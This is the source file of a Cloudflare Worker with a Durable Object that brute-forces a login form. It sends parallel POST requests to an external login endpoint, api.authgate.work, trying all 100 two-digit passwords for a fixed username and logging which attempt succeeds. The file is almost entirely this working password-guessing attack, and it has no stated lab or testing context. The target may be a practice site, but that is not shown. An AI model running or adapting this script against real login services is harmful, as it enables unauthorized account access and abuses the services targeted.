/**
 * Welcome to Cloudflare Workers! This is your first worker.
 *
 * - Run `npm run dev` in your terminal to start a development server
 * - Open a browser tab at http://localhost:8787/ to see your worker in action
 * - Run `npm run deploy` to publish your worker
 *
 * Learn more at https://developers.cloudflare.com/workers/
 */

export default {
	async fetch(request, env, ctx) {
		// Get the ID of the Durable Object.
		const id = env.authgate.idFromName('Fetcher');

		// Get the instance of the Durable Object.
		const obj = env.authgate.get(id);

		// Use the Durable Object.
		const response = await obj.fetch(request);

		return response;
	},
};

export class Fetcher {
	constructor(state, env) {
		this.state = state;
	}

	async fetch(request) {
		// Generate and try all two-digit number permutations as passwords
		const targetUrl = 'https://api.authgate.work/login';
		const passwords = generateTwoDigitNumberPermutations();

		const promises = passwords.map((password) => {
			const formData = new FormData();
			formData.append('username', 'test@test.com'); // Username is known
			formData.append('password', password);

			return fetch(targetUrl, {
				method: 'POST',
				body: formData,
			}).then((response) => {
				if (response.status === 200) {
					// Handle successful login
					console.log('Login successfully!');
				} else {
					// Handle failed login
					console.log('Failed login.');
				}
			});
		});

		await Promise.all(promises);

		return new Response('Login attempts with all two-digit number permutations completed.', { status: 200 });
	}
}

function generateTwoDigitNumberPermutations() {
	const passwords = [];
	for (let i = 0; i < 100; i++) {
		const password = i.toString().padStart(2, '0');
		passwords.push(password);
	}
	return passwords;
}
